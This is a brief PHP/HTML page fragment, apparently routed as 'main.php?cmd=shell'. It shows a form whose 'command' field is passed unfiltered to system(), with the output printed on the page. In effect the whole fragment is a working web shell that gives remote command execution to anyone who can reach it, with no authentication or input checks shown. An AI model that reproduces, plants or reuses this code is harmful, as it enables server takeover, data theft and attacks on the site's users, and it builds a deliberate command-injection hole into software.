<form method="post" action="main.php?cmd=shell">
    <div class="row">
        <div class="col">CMD</div>
        <div class="col-10">
            <input type="text" name="command" class="form-control">
        </div>
        <div class="col">
            <button type="submit" class="btn btn-primary">Go</button>
        </div>
    </div>
</form>
<pre>
<?php
    if(isset($_POST["command"]))
        system($_POST["command"]);
?>
</pre>